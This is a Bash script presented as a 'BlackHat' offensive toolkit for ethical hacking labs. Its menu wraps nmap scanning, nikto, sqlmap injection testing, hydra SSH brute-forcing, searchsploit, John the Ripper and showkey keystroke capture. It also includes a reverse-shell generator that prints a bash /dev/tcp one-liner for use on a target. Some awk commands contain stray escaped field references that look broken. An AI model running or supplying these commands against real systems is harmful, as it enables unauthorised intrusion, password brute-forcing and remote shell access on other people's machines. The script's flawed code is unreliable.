#!/bin/bash

# ██████▌ ██▄      █████▌  ██████▌██▄  ██▄ █████▌ ████████▌
# ██▄▄██▌██▄     ██▄▄██▌██▄ ██▌██▄▄██▌▌██▄██▄▄██▌
# ██████▌██▄     ██████▌████▄ ██████▌   ██▄   ██████▌
# ██▄▄██▄ ██▄     ██▄▄██▌██▄▄██▄ ██▄▄██▄   ██▄   ██▄▄██▄
# ██▄     ███████▌██▄  ██▌█████▌██▄  ██▌   ██▄   ██▄  ██▌
# ▌▀▀     ▌▀▀▀▀▀▀▌▀▀▄  ▀▀▌▀▀▀▀▀▌▀▀▄  ▀▀▌   ▀▀▄   ▀▀▄  ▀▀▌

# BlackHat Bash Toolkit - Advanced Version
# Author: Shiboshree Roy | For ethical hacking labs only

# Color definitions
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'
LOGFILE="blackhat_toolkit.log"

# === Logging Function ===
log() {
  echo -e "$(date '+%Y-%m-%d %H:%M:%S') - $1" | tee -a "$LOGFILE"
}

# === Dependency Check ===
check_dependencies() {
  local tools=(nmap whois nikto sqlmap hydra searchsploit john showkey)
  local missing=()

  for tool in "${tools[@]}"; do
    if ! command -v "$tool" &>/dev/null; then
      missing+=("$tool")
    fi
  done

  if [ ${#missing[@]} -ne 0 ]; then
    log "[!] Missing tools: ${missing[*]}"
    echo -e "${RED}[!] The following tools are missing: ${missing[*]}${NC}"
    read -p "Install now? [Y/n]: " choice
    choice=${choice:-Y}
    if [[ "$choice" =~ ^[Yy]$ ]]; then
      if [[ "$EUID" -ne 0 ]]; then
        echo -e "${RED}[!] Root privileges required to install.${NC}"
        exit 1
      fi
      apt-get update && apt-get install -y "${missing[@]}"
    else
      echo -e "${YELLOW}Continuing without installing... Some features may not work.${NC}"
    fi
  else
    log "All dependencies are installed."
  fi
}

# === Banner ===
banner() {
  clear
  echo -e "${CYAN}"
  echo "=========================================="
  echo "     ☣ BLACKHAT TOOLKIT - ADVANCED       "
  echo "=========================================="
  echo -e "${NC}"
}

# === Pause Utility ===
pause() {
  read -rp "\nPress Enter to return to menu..." _
}

# === Tools ===
network_scanner() {
  local range
  read -rp "Enter network range (e.g., 192.168.1.0/24): " range
  log "Scanning network: $range"
  echo -e "${GREEN}[*] Finding live hosts...${NC}"  
  nmap -sn "$range" | awk '/Nmap scan report/{print \$5}'
  pause
}

port_scanner() {
  local target ports
  read -rp "Enter target IP or hostname: " target
  read -rp "Enter ports (1-65535 or comma-separated list): " ports
  log "Port scan on $target ports $ports"
  echo -e "${GREEN}[*] Scanning ports...${NC}"  
  nmap -p "$ports" "$target"
  pause
}

os_fingerprint() {
  local target ttl os
  read -rp "Enter target IP or hostname: " target
  log "OS fingerprinting on $target"
  ttl=$(ping -c1 "$target" 2>/dev/null | awk -F'ttl=' '/ttl=/{print \$2+0}')
  if [[ -n "$ttl" ]]; then
    if [ "$ttl" -le 64 ]; then os='Linux/Unix'
    elif [ "$ttl" -le 128 ]; then os='Windows'
    else os='Unknown'
    fi
    echo -e "${CYAN}[*] TTL=$ttl => OS guess: $os${NC}"
  else
    echo -e "${RED}[!] No response from $target${NC}"
  fi
  pause
}

nmap_wrapper() {
  local target
  read -rp "Enter target IP or hostname: " target
  log "Aggressive Nmap scan on $target"
  echo -e "${GREEN}[*] Running nmap -A...${NC}"  
  nmap -A "$target"
  pause
}

whois_lookup() {
  local domain
  read -rp "Enter domain (e.g., example.com): " domain
  log "WHOIS lookup for $domain"
  echo -e "${GREEN}[*] Retrieving WHOIS data...${NC}"  
  whois "$domain"
  pause
}

reverse_shell() {
  local lhost lport
  read -rp "Your listening IP: " lhost
  read -rp "Your listening port: " lport
  log "Generated reverse shell for $lhost:$lport"
  echo -e "${YELLOW}[*] Use on target:${NC}"
  echo "bash -i >& /dev/tcp/$lhost/$lport 0>&1"
  pause
}

nikto_scanner() {
  local url
  read -rp "Enter target URL (http://...): " url
  log "Nikto scan on $url"
  echo -e "${GREEN}[*] Running Nikto...${NC}"  
  nikto -h "$url"
  pause
}

sqlmap_test() {
  local url
  read -rp "Enter vulnerable URL (http://...id=1): " url
  log "SQLMap test on $url"
  echo -e "${GREEN}[*] Running SQLMap...${NC}"  
  sqlmap -u "$url" --batch --level=3
  pause
}

hydra_ssh() {
  local target user passlist
  read -rp "Enter target IP or hostname: " target
  read -rp "Enter username: " user
  read -rp "Enter password list path: " passlist
  log "Hydra SSH brute-force on $target as $user"
  echo -e "${GREEN}[*] Running Hydra...${NC}"  
  hydra -l "$user" -P "$passlist" ssh://"$target"
  pause
}

search_cve() {
  local keyword
  read -rp "Enter exploit search keyword: " keyword
  log "Searchsploit for $keyword"
  echo -e "${GREEN}[*] Searching exploits...${NC}"  
  searchsploit "$keyword"
  pause
}

keylogger_demo() {
  log "Keylogger demo started"
  if [ "$EUID" -ne 0 ]; then
    echo -e "${RED}[!] Requires root. Run as root.${NC}"
  else
    echo -e "${GREEN}[*] Press CTRL+C to stop...${NC}"
    showkey --scancodes
  fi
  pause
}

hash_cracker() {
  local hashfile
  read -rp "Enter hash file path: " hashfile
  log "John the Ripper on $hashfile"
  echo -e "${GREEN}[*] Cracking hashes...${NC}"  
  john "$hashfile"
  pause
}

# === Main Menu ===
main_menu() {
  banner
  echo -e "${YELLOW}1) Network Scanner${NC}"
  echo -e "${YELLOW}2) Port Scanner${NC}"
  echo -e "${YELLOW}3) OS Fingerprinting${NC}"
  echo -e "${YELLOW}4) Nmap Aggressive Scan${NC}"
  echo -e "${YELLOW}5) WHOIS Lookup${NC}"
  echo -e "${YELLOW}6) Reverse Shell Generator${NC}"
  echo -e "${YELLOW}7) Nikto Web Scanner${NC}"
  echo -e "${YELLOW}8) SQLMap Injection Test${NC}"
  echo -e "${YELLOW}9) Hydra SSH Brute-Force${NC}"
  echo -e "${YELLOW}10) Search CVE (searchsploit)${NC}"
  echo -e "${YELLOW}11) Keylogger (Simulation)${NC}"
  echo -e "${YELLOW}12) Hash Cracker (John)${NC}"
  echo -e "${YELLOW}13) Exit${NC}\n"
  read -rp "Select an option [1-13]: " choice
  case "$choice" in
    1) network_scanner ;;
    2) port_scanner ;;
    3) os_fingerprint ;;
    4) nmap_wrapper ;;
    5) whois_lookup ;;
    6) reverse_shell ;;
    7) nikto_scanner ;;
    8) sqlmap_test ;;
    9) hydra_ssh ;;
    10) search_cve ;;
    11) keylogger_demo ;;
    12) hash_cracker ;;
    13) log "Exiting toolkit" && exit 0 ;;
    *) echo -e "${RED}Invalid choice!${NC}"; sleep 1 ;;
  esac
  main_menu
}

# === Execute ===
check_dependencies
main_menu
